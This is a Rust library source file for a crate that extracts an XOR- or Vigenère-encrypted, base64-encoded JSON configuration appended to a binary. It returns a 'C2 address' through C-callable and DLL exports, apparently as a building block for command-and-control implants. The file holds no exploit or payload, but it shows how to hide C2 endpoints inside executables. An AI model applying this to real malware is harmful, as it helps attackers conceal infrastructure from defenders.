//! this crate provides functions that allow for the extraction and
//! usage of a malleable configuration that has been embedded within
//! the binary itself.
//!
//! this includes simple encryption (XOR) and base64 encoding, along
//! with expecting a custom structure for the embedded configuration.
//!
//! embedded data structure:
//!
//! [N bytes of encrypted data][8 bytes holding length N]
//!
//! functions of note:
//!
//! 1. `read()` - rust function that will extract and process the config bytes
//! then return a Configuration struct (or error). meant to be called by
//! other rust programs.
//!
//! 2. `read_cfg()` - function designed to be part of a shared object or DLL
//! that can be used by C, Python, etc programs. this returns a char* holding
//! the "address:port" from the configuration.
//!
//! 3. `free_memory()` - function designed to free the char* created by read_cfg()
//! because the memory is owned by rust and must be freed by rust when the caller
//! is done with it. this is similar to the free() function in C.
//!
//! 4. `read_self()` - ease of use rust function designed to extract the configuration
//! from the current binary. this takes in a key and will create its own SelfExtractor
//! and pass it to the read() function.
//!
//! 5. `read_cfg_from_file()` - function designed to be part of a shared object or DLL
//! that can be used by C, Python, etc programs. this returns a c*  holding the
//! "address:port" from the configuration extracted from the given file.
//!
//! 6. `read_from_file()` - ease of use rust function designed to extract the configuration
//! from a specified file. this takes in a filename (string) and key and will create its
//! own FileExtractor and pass it to the read() function.
//!
//! 7. `read_from_vec()` - ease of use rust function designed to extract the configuration
//! from a specified `Vec<u8>`. this takes in the `Vec<u8>` and key and will create its own
//! BytesExtractor and pass it to the read() function.

pub mod extractor;
pub mod models;
mod transformer;

#[cfg(target_os = "windows")]
use windows::Win32::{
    Foundation::HINSTANCE,
    System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
};

#[cfg(test)]
mod unit_tests;

/// custom type defining the standard return for the rust read functions.
pub type CfgResult = std::result::Result<models::core::Configuration, Box<dyn std::error::Error>>;

/// helper function deisgned to take a key passed in as a C string
/// and convert it to a byte array.
fn convert_key_from_c(raw_key: &*const std::ffi::c_char) -> &[u8] {
    let key: &[u8];

    // if null is passed in as the key, use q as the default;
    // otherwise use the char* key passed in.
    if raw_key.is_null() {
        key = "q".as_bytes();
    } else {
        // convert the input to a CStr.
        //
        // this borrows the value from the memory that is owned
        // by the caller.
        let key_cstr: &std::ffi::CStr = unsafe { std::ffi::CStr::from_ptr(*raw_key) };

        // convert the CStr holding the key to bytes so it can
        // be used later on.
        key = key_cstr.to_bytes();
    }

    key
}

/// helper function designed to format the C2 address held in the configuration
/// struct and return it as a *char that can be used by C.
fn format_address_c(configuration: models::core::Configuration) -> *const std::ffi::c_char {
    let address: String = format!(
        "{}://{}:{}",
        configuration.scheme.to_string(),
        configuration.host,
        configuration.port
    );

    // convert the String (rust) into a CString so it can be converted
    // into a char* and returned.
    let address_cstring: std::ffi::CString = match std::ffi::CString::new(address) {
        Ok(result) => result,
        Err(_) => return std::ptr::null(),
    };

    address_cstring.into_raw()
}

/// function designed to run through the process of extracting,
/// transforming and deserializing configuration data from the
/// current binary.
///
/// this is the main logic function of this library.
///
/// for most use-cases the `extractor::core::SelfExtractor` struct
/// is what should be passed in as the `reader`. this struct implements
/// logic that will read the configuration bytes from the end of
/// the current binary.
pub fn read<T, D>(reader: T, decryptor: D) -> CfgResult
where
    T: extractor::core::CfgExtractor,
    D: cfgparser_encryption::Decryptor,
{
    // read configuration bytes from current binary.
    let cfg_bytes: Vec<u8> = reader.extract_cfg_bytes()?;

    // decrypt and base64 decode the bytes extracted in the previous
    // step to get a string representation of the JSON structure holding
    // the configuration information.
    let decoded_vec: Vec<u8> = transformer::core::transform_payload(decryptor, &cfg_bytes)?;
    let decoded: String = String::from_utf8_lossy(&decoded_vec).to_string();

    // JSON deserialize the string acquired from the process above into
    // a Configuration struct.
    Ok(transformer::core::deserialize_payload(decoded)?)
}

/// ease-of-use function designed to call read() with a SelfExtractor
/// and the passed in decryptor.
pub fn read_self<D>(decryptor: D) -> CfgResult
where
    D: cfgparser_encryption::Decryptor,
{
    let reader: extractor::core::SelfExtractor = extractor::core::SelfExtractor {};
    read(reader, decryptor)
}

/// ease-of-use function designed to call read() with a FileExtractor
/// built using filename passed in and the passed in decryptor.
pub fn read_from_file<D>(filename: String, decryptor: D) -> CfgResult
where
    D: cfgparser_encryption::Decryptor,
{
    let reader: extractor::core::FileExtractor = extractor::core::FileExtractor::new(filename);
    read(reader, decryptor)
}

/// ease-of-use function designed to call read() with a BytesExtractor
/// built using the `Vec<u8>` passed in and the decryptor passed in.
pub fn read_from_vec<D>(stream: Vec<u8>, decryptor: D) -> CfgResult
where
    D: cfgparser_encryption::Decryptor,
{
    let reader: extractor::core::BytesExtractor = extractor::core::BytesExtractor::new(stream);
    read(reader, decryptor)
}

#[no_mangle]
/// function designed to read the configuration bytes and
/// return the C2 address. this will read the data from the
/// end of the binary, XOR decrypt it, Base64 decode,
/// JSON decode it, then grab the address and port from the
/// Configuration struct that resulted from the JSON decoding.
pub extern "C" fn read_cfg(raw_key: *const std::ffi::c_char) -> *const std::ffi::c_char {
    // if null is passed in as the key, use q as the default;
    // otherwise use the char* key passed in.
    let key: &[u8] = convert_key_from_c(&raw_key);
    // create an XORDecryptor by default.
    //
    // high possibility this will be updated later to be
    // determined by the user's input.
    let decryptor: cfgparser_encryption::xor::engine::XORCipher =
        cfgparser_encryption::xor::engine::XORCipher::new(key.to_vec());

    // read the Configuration from the current binary.
    let configuration: models::core::Configuration = match read_self(decryptor) {
        Ok(result) => result,
        Err(_) => return std::ptr::null(),
    };

    format_address_c(configuration)
}

#[no_mangle]
/// function designed to read the configuration bytes and
/// return the C2 address. this will read the data from the
/// end of the binary, decrypt it based on the encryption type
/// passed in by the user, Base64 decode, JSON decode it, then
/// grab the address and port from the Configuration struct that
/// resulted from the JSON decoding.
pub extern "C" fn read_cfg_with_encryption(
    raw_key: *const std::ffi::c_char,
    enc_type: std::ffi::c_int,
) -> *const std::ffi::c_char {
    // if null is passed in as the key, use q as the default;
    // otherwise use the char* key passed in.
    let key: &[u8] = convert_key_from_c(&raw_key);

    // attempt to convert the user input into a rust i32 var.
    //
    // if this fails, NULL will be returned.
    let enc_type_i32: i32 = match enc_type.try_into() {
        Ok(int_val) => int_val,
        Err(_) => return std::ptr::null(),
    };

    // create the decryptor based on the user's input. this will compare
    // the int with the enum to determine what kind of decryptor to create.
    //
    // if an invalid int is passed in, or an error occurs, NULL will be returned.
    let read_result: CfgResult;
    if enc_type_i32 == cfgparser_encryption::EncryptionType::Xor as i32 {
        let decryptor: cfgparser_encryption::xor::engine::XORCipher =
            cfgparser_encryption::xor::engine::XORCipher::new(key.to_vec());
        read_result = read_self(decryptor);
    } else if enc_type_i32 == cfgparser_encryption::EncryptionType::Viginere as i32 {
        let decryptor: cfgparser_encryption::viginere::engine::ViginereCipher =
            match cfgparser_encryption::viginere::engine::ViginereCipher::new(key.to_vec()) {
                Ok(vc) => vc,
                Err(_) => return std::ptr::null(),
            };
        read_result = read_self(decryptor);
    } else {
        read_result = Err("invalid encryption type".into());
    }

    // read the Configuration from the current binary.
    let configuration: models::core::Configuration = match read_result {
        Ok(result) => result,
        Err(_) => return std::ptr::null(),
    };

    format_address_c(configuration)
}

#[no_mangle]
/// function designed to take in a filename and key, extract configuration
/// information from the target and return a `<host>:<port>` string.
///
/// this performs the same reading logic as "read_cfg" with the only difference
/// being it is not reading from the current binary, but from a user-specified file.
pub extern "C" fn read_cfg_from_file(
    raw_filename: *const std::ffi::c_char,
    raw_key: *const std::ffi::c_char,
) -> *const std::ffi::c_char {
    let filename: &str;

    if raw_filename.is_null() {
        return std::ptr::null();
    }

    // convert the filename input to a CStr.
    //
    // this borrows the value from the memory that is owned
    // by the caller.
    let filename_cstr: &std::ffi::CStr = unsafe { std::ffi::CStr::from_ptr(raw_filename) };

    // convert the CStr holding the key to bytes so it can
    // be used later on.
    filename = match filename_cstr.to_str() {
        Ok(result) => result,
        Err(_) => return std::ptr::null(),
    };

    // if null is passed in as the key, use q as the default;
    // otherwise use the char* key passed in.
    let key: &[u8] = convert_key_from_c(&raw_key);
    // create an XORDecryptor by default.
    //
    // high possibility this will be updated later to be
    // determined by the user's input.
    let decryptor: cfgparser_encryption::xor::engine::XORCipher =
        cfgparser_encryption::xor::engine::XORCipher::new(key.to_vec());

    // read the Configuration from the target file.
    let configuration: models::core::Configuration =
        match read_from_file(filename.to_string(), decryptor) {
            Ok(result) => result,
            Err(_) => return std::ptr::null(),
        };

    format_address_c(configuration)
}

#[no_mangle]
/// function designed to safely free a `char*` pointer that
/// has been allocated by rust.
///
/// this should be called when the caller is done with the
/// memory, similar to how free(ptr) is used in C.
pub extern "C" fn free_memory(ptr: *mut std::ffi::c_char) {
    if ptr.is_null() {
        return;
    }

    let _ = unsafe { std::ffi::CString::from_raw(ptr) };
}

#[cfg(target_os = "windows")]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
/// references:
///
/// https://samrambles.com/guides/window-hacking-with-rust/creating-a-dll-with-rust/index.html#dllmain
pub extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => (),
    }

    true
}
